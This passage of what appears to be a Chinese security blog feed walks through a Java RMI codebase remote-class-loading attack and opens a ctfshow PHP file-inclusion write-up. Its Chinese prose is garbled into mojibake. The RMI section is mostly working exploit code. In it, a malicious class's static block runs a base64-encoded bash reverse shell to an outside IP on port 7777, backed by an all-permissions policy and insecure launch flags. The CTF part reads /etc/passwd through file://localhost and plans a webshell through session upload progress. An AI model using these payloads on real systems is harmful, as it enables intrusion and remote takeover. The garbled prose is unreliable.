java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">ICalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨Listç±»æ¥åå‚æ•°æ˜¯å› ä¸ºæˆ‘ä»¬å¦‚æœæƒ³è¦æœåŠ¡ç«¯è°ƒç”¨æˆ‘ä»¬codebaseçš„æ¶æ„ç±»é¦–å…ˆè¦ä¼ è¾“ç»™æœåŠ¡ç«¯è¿™ä¸ªæ¶æ„ç±»çš„ç±»,è€Œæˆ‘ä»¬åƒä¼ ç»™å…¶ä¿¡æ¯åªèƒ½åœ¨æ¥å£å‚æ•°åŠ¨æ‰‹è„š,ä½†æ˜¯æ¥å£çš„å‚æ•°ç±»å‹æ˜¯å†™æ­»çš„,ä½†æ˜¯ç±»å¯ä»¥ç»§æ‰¿äºArraylistè¿™ä¸ªç±»,è¿™å¯¼è‡´æˆ‘ä»¬å¯ä»¥å°†æ¶æ„ç±»å®šä¹‰ä¸ºListç±»å‹å¦‚ä½•ä¼ ç»™æœåŠ¡ç«¯,ä»è€Œè®©æœåŠ¡ç«¯å»codebaseæŸ¥æ‰¾æ¶æ„ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Server.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸ºäº†è®©å®¢æˆ·ç«¯è®¿é—®å…¶æ—¶æœ‰æœ€å¤§é™åº¦çš„æƒé™,è¿™æ ·æ‰å¯ä»¥è®©å…¶è®¿é—®codebaseæŒ‡å‘çš„url</span></span><br></pre></td></tr></table></figure><br>Cient.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//Cient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.20.128:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Run</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä¸€å¼€å§‹çœ‹pç‰›æ–‡ç« çš„æ—¶å€™æˆ‘å‘ç°å…¶æ˜¯ä½¿ç”¨å¦‚ä¸Šçš„Cientç«¯æ¥åƒServerç«¯å‘é€è¯·æ±‚çš„,é‚£ä¹ˆè¿™æ—¶Serveréœ€è¦åˆ°codebaseå¯»æ‰¾çš„æ¶æ„ç±»Runå°±æ˜¯<code>Client$Run.class</code>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦åœ¨Clienté‡Œå†™ä¸€ä¸ªå†…ç½®ç±»åœ¨å†…ç½®ç±»é‡Œå†™ä¸€ä¸ªstaticæ¥è®©å…¶åœ¨è¢«åŠ è½½æ—¶ä¼šè¢«è°ƒç”¨å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMjMwLjM4LjE1OS83Nzc3IDA+JjEnCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/09/07/RMI/15.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°å…¶åœ¨jdk16æ‰æ”¯æŒäºç±»å†…å®šä¹‰Staticã€‚å½“ç„¶åªè¦å‡çº§è¿è¡ŒjDKç‰ˆæœ¬å³å¯ã€‚</p><p>ä½†æ˜¯æœ‰ç‚¹å°å°çš„éº»çƒ¦ï¼Œäºæ˜¯æˆ‘å‘ç°å¯ä»¥åªè¦åœ¨Clientå¤–å®šä¹‰ä¸€ä¸ªç»§æ‰¿äº†Listçš„Runç±»ç„¶åç›´æ¥åœ¨Cilené‡Œå®ä¾‹åŒ–åä¼ å‚å³å¯å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Client.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.20.128:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Run</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Client</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Run.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Run</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC4xNTkvNzc3NyAwPiYxJw==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;Run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>Run.javaäºCilentæ”¾åœ¨åŒä¸€ä¸ªåŒ…ä¸‹ï¼Œè€ŒRun.javaåˆæ˜¯æ¶æ„ç±»çš„javaæºç ã€‚<br>æˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹ä»£ç å¯åŠ¨Serverç±»<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.hostname=192.168.135.142 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure><br>Clientå¯åŠ¨<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http://example.com/ Client</span><br></pre></td></tr></table></figure><br><code>http://example.com/</code>ä¸ºæˆ‘ä»¬æ”¾ç½®æ¶æ„ç±»çš„åœ°æ–¹ã€‚æˆ‘è¿™é‡Œç”¨çš„æ—¶pythonçš„httpæœåŠ¡<br>åœ¨æˆ‘ä»¬å¯åŠ¨äº†Cientè¯·æ±‚Serveræ—¶æˆ‘ä»¬ä¼šå‘ç°å…¶å› ä¸ºæœåŠ¡å™¨å†…æ²¡æœ‰Run.classè¿™ä¸ªç±»æ‰€ä»¥åƒcodebaseè¯·æ±‚äº†Run.java<br><img src="/2024/09/07/RMI/13.png" class="" title="alt text"><br>ä¹‹åæˆåŠŸåå¼¹äº†shellå³åŠ è½½äº†Run.class<br><img src="/2024/09/07/RMI/14.png" class="" title="alt text"></p><h1 id="åˆ†æä¸€ä¸‹RMIåœ¨codebaseæ”»å‡»æ—¶çš„æµé‡"><a href="#åˆ†æä¸€ä¸‹RMIåœ¨codebaseæ”»å‡»æ—¶çš„æµé‡" class="headerlink" title="åˆ†æä¸€ä¸‹RMIåœ¨codebaseæ”»å‡»æ—¶çš„æµé‡"></a>åˆ†æä¸€ä¸‹RMIåœ¨codebaseæ”»å‡»æ—¶çš„æµé‡</h1><p>æˆ‘ä»¬æ¥çœ‹éœ€è¦RMI_cdebaseæ”»å‡»çš„æµé‡æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æµé‡æ¥å°è¯•åˆ†æcodebaseæ˜¯åœ¨å“ªä¸ªç‚¹è¢«åŠ è½½æ´»ä¼ å…¥çš„<br><img src="/2024/09/07/RMI/17.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Callæ¶ˆæ¯çš„åŒ…é‡Œæœ‰ä¸€ä¸ªjavaåºåˆ—åŒ–çš„æ¶ˆæ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå·¥å…·æ¥å°†å°†åºåˆ—åŒ–å†…å®¹çš„16è¿›åˆ¶å­—ç¬¦è¿›è¡Œååºåˆ—æŸ¥çœ‹å†…å®¹ã€‚<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a><br><img src="/2024/09/07/RMI/18.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªCallæ¶ˆæ¯<br>æƒ³è¦çœ‹æ‡‚ä»–æˆ‘ä»¬éœ€è¦é…åˆæ–‡æ¡£æ¥æŸ¥çœ‹<a href="https://doc.qzxdp.cn/jdk/20/zh/specs/serialization/protocol.html">Java å¯¹è±¡åºåˆ—åŒ–è§„èŒƒ</a><br>å½“ç„¶å¯¹æˆ‘æ¥è¯´ï¼Œå…‰çœ‹è¿™ä¸ªæ–‡æ¡£æˆ‘è‚¯å®šæ˜¯çœ‹ä¸æ‡‚çš„ï¼Œæ‰€ä»¥æˆ‘è¿˜é…åˆäº†aiè®©æˆ‘ç†è§£è¿™äº›éƒ½æ˜¯å•¥</p><p>æ€»çš„æ¥è¯´è¿™äº›æµæ•°æ®çš„ç»„æˆå…¶å®å°±æ˜¯ä¸¤ä¸ªå¤§éƒ¨<code>æµå¤´éƒ¨(STREAM_MAGIC å’Œ STREAM_VERSION)</code>å’Œ<code>æµå†…å®¹(Contents)</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1. æµå¤´éƒ¨</span><br><span class="line">STREAM_MAGIC å’Œ STREAM_VERSIONï¼šæµçš„é­”æ•°å’Œç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ†åˆ«æ˜¯ 0xaced å’Œ 0x05ã€‚å®ƒä»¬æ€»æ˜¯å‡ºç°åœ¨åºåˆ—åŒ–æµçš„å¼€å§‹ä½ç½®ï¼Œç”¨æ¥æ ‡è¯†è¿™æ˜¯ä¸€ä¸ªJavaå¯¹è±¡æµã€‚</span><br><span class="line">2. æµå†…å®¹ï¼ˆcontentsï¼‰</span><br><span class="line">æµå†…å®¹å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡æˆ–å—æ•°æ®ï¼Œç»“æ„ä¸Šç”±ä¸åŒçš„æ ‡è®°ï¼ˆæ ‡è¯†ç¬¦ï¼‰æ¥è¡¨ç¤ºå¯¹è±¡ã€æ•°ç»„ã€å­—ç¬¦ä¸²ã€ç±»æè¿°ç¬¦ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">contentï¼šè¡¨ç¤ºåºåˆ—åŒ–æµçš„å®é™…å†…å®¹ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆobjectï¼‰æˆ–å—æ•°æ®ï¼ˆblockdataï¼‰ã€‚</span><br><span class="line">3. å¯¹è±¡ï¼ˆobjectï¼‰</span><br><span class="line">newObjectã€newClassã€newArrayã€newStringã€newEnum ç­‰ï¼šè¡¨ç¤ºåºåˆ—åŒ–ä¸­çš„æ–°å¯¹è±¡ç±»å‹ã€‚æ¯ç§ç±»å‹éƒ½æœ‰ç‰¹å®šçš„æ ‡è¯†ç¬¦ï¼ˆä¾‹å¦‚ TC_OBJECTã€TC_CLASSï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">prevObjectã€nullReferenceã€exception ç­‰ï¼šè¡¨ç¤ºå¼•ç”¨ç±»å‹çš„å¯¹è±¡ï¼Œä¾‹å¦‚ä¹‹å‰å‡ºç°çš„å¯¹è±¡ï¼ˆprevObjectï¼‰ï¼Œnullå¼•ç”¨ï¼ˆnullReferenceï¼‰ï¼Œæˆ–è€…ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ï¼ˆexceptionï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">4. ç±»æè¿°ç¬¦ï¼ˆclassDesc å’Œ classDescInfoï¼‰</span><br><span class="line">ç±»æè¿°ç¬¦ç”¨äºæè¿°åºåˆ—åŒ–å¯¹è±¡çš„ç±»ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»åã€åºåˆ—åŒ–ç‰ˆæœ¬UIDï¼ˆserialVersionUIDï¼‰ã€å­—æ®µä¿¡æ¯å’Œçˆ¶ç±»æè¿°ç¬¦ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">newClassDescã€TC_CLASSDESCï¼šæ–°ç±»æè¿°ç¬¦çš„å®šä¹‰ï¼ŒåŒ…æ‹¬ç±»åã€åºåˆ—åŒ–ç‰ˆæœ¬UIDç­‰ä¿¡æ¯ã€‚</span><br><span class="line"></span><br><span class="line">fieldsï¼šå­—æ®µä¿¡æ¯æè¿°ç¬¦ï¼Œæè¿°å¯¹è±¡çš„å„ä¸ªå­—æ®µç±»å‹åŠåç§°ã€‚</span><br><span class="line"></span><br><span class="line">5. æ ‡è®°å’Œå¸¸é‡</span><br><span class="line">è¿™äº›æ˜¯æµä¸­çš„å…³é”®æ ‡è®°ï¼Œç”¨äºæ ‡è¯†åºåˆ—åŒ–å†…å®¹çš„ç±»å‹ï¼š</span><br><span class="line"></span><br><span class="line">TC_NULLã€TC_REFERENCEã€TC_CLASSDESCã€TC_OBJECTã€TC_STRING ç­‰ï¼šè¡¨ç¤ºä¸åŒç±»å‹çš„æ•°æ®æˆ–å¯¹è±¡ã€‚</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„æµæ•°æ®æ¶‰åŠåˆ°äº†å¦‚ä¸‹çš„è¯­æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">stream:</span><br><span class="line"> magic version contents</span><br><span class="line"></span><br><span class="line">contents:</span><br><span class="line"> content</span><br><span class="line"> contents content</span><br><span class="line"></span><br><span class="line">content:</span><br><span class="line"> object</span><br><span class="line"> blockdata</span><br><span class="line"></span><br><span class="line">object:</span><br><span class="line"> newObject</span><br><span class="line"> newClass</span><br><span class="line"> newArray</span><br><span class="line"> newString</span><br><span class="line"> newEnum</span><br><span class="line"> newClassDesc</span><br><span class="line"> prevObject</span><br><span class="line"> nullReference</span><br><span class="line"> exception</span><br><span class="line"> TC_RESET</span><br><span class="line"></span><br><span class="line">blockdata:</span><br><span class="line"> blockdatashort</span><br><span class="line"> blockdatalong</span><br><span class="line"></span><br><span class="line">blockdatashort:</span><br><span class="line"> TC_BLOCKDATA (unsigned <span class="type">byte</span>)&lt;size&gt; (<span class="type">byte</span>)[size]</span><br><span class="line">newString:</span><br><span class="line"> TC_STRING <span class="title function_">newHandle</span> <span class="params">(utf)</span></span><br><span class="line"> TC_LONGSTRING <span class="title function_">newHandle</span> <span class="params">(<span class="type">long</span>-utf)</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬è™½ç„¶æ— æ³•è§£è¯»å‡ºå—æ•°æ®ä¼ äº†ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥å…¶ä¼ äº†ä¸€ä¸ªStringçš„ç±»å†…å®¹ä¸ºrefObjï¼Œå…¶å®ä¹Ÿå°±æ˜¯ä¼ äº†ä¸ªå­—ç¬¦ä¸²è¿‡å»ï¼Œè¿™ä¸ªä¼ è¿‡å»æ¥è¯·æ±‚Registry</p><p>æŸ¥çœ‹è¿‡å‡ ä¸ªååºåˆ—æµé‡åŒ…åå‘ç°äº†å¦‚ä¸‹æµé‡åŒ…<br><img src="/2024/09/07/RMI/19.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å‘ç°çš„codebaseæ•°æ®ï¼Œå…¶å‡ºç°åœ¨äº†classAnnotationså³å…¶æ˜¯é€šè¿‡classAnnotationsæ¥ä¼ é€’çš„ï¼Œå³æˆ‘ä»¬åªè¦ä¿®æ”¹classAnnotationså°±å¯ä»¥æ§åˆ¶codebase</p><h2 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a>classAnnotations</h2><p>classAnnotationså…¶å®æ˜¯æˆ‘ä»¬åœ¨javaåºåˆ—å·æ—¶ç”¨åˆ°çš„ä¸€ä¸ªç±»ObjectOutputStreamï¼Œè¿™ä¸ªç±»å†…éƒ¨å­˜åœ¨ä¸€ä¸ªæ–¹æ³•å«annotateClasså½“ObjectOutputStreamçš„å­ç±»éœ€è¦å‘åºåˆ—åŒ–æ–‡ä»¶å†™å…¥ä¸€äº›å†…å®¹æ—¶ä¼šé‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œè€ŒclassAnnotationså…¶å®å°±æ˜¯annotateClasså†™å…¥çš„å†…å®¹ã€‚<br>åœ¨RMiä¸­è¿œç¨‹ä¼ è¾“åºåˆ—å·æ˜¯ç”±ObjectOutputStreamæ¥è¿›è¡Œçš„ï¼Œè€Œè¿™ä¸ªç±»ä¹Ÿç†æ‰€å½“ç„¶æ˜¯ObjectOutputStreamçš„å­ç±»ã€‚ä¼ å…¥codebaseå…¶å®å°±æ˜¯è°ƒç”¨annotateClassæ¥é‡å†™æ·»åŠ åºåˆ—å·å†…å®¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> RMI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> RMI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow å…ƒæ—¦æ¯åˆ·é¢˜</title>
      <link href="/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/"/>
      <url>/2024/09/05/ctfshow-%E5%85%83%E6%97%A6%E6%9D%AF%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å…¶å®å¹¶ä¸ç®—éš¾,åªæ˜¯æœ‰ä¸€ä¸ªå°ç‚¹ä¸çŸ¥é“å¯¼è‡´ä¸€å¼€å§‹å°±å¡ä½äº†.<br>è¿™ä¸ªç‚¹å°±æ˜¯åˆ©ç”¨<code>file://localhost/etc/passwd</code>å¯ä»¥åƒä¸Šé¢é‚£æ ·åŒ…å«æ–‡ä»¶ã€‚<br>è€Œåçš„æ–¹æ³•å°±å¾ˆå¤šäº†<br>æˆ‘ä¸€å¼€å§‹åƒåˆ°çš„æ˜¯åˆ©ç”¨sessionè¿›åº¦ä¸Šä¼ æ¥ä¸Šä¼ ä¸€ä¸ªwebshellç„¶åè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚ä¹Ÿå°±æ˜¯è¿™é¢˜çš„æ³•ä¸€</p><h2 id="æ³•ä¸€sessionä¸Šä¼ è¿›åº¦-æ–‡ä»¶åŒ…å«-getshell"><a href="#æ³•ä¸€sessionä¸Šä¼ è¿›åº¦-æ–‡ä»¶åŒ…å«-getshell" class="headerlink" title="æ³•ä¸€sessionä¸Šä¼ è¿›åº¦+æ–‡ä»¶åŒ…å«=getshell"></a>æ³•ä¸€sessionä¸Šä¼ è¿›åº¦+æ–‡ä»¶åŒ…å«=getshell</h2><p>æˆ‘åœ¨ä¹‹å‰å­¦sessionååºåˆ—åŒ–æ—¶æœ‰å­¦è¿‡sessionä¸Šä¼ è¿›åº¦ï¼Œè¿™æ˜¯å½“å¼€å¯äº†session.upload_progress.enabledæ—¶æˆ‘ä»¬POSTä¸€ä¸ªä¸session.upload_progress.enabledåŒåçš„å˜é‡æ—¶ä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<code>$_SSESION</code>ä¸­è·å¾—å³è¢«ä¿å­˜ä¸ºäº†sessionæ–‡ä»¶ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªæ€§è´¨æ¥è¿›è¡Œæ¡ä»¶è¿›äº‰ã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://f959da0c-43a6-4b79-83b9-ac0a1b6d43d6.challenge.ctf.show/&quot;</span> <span 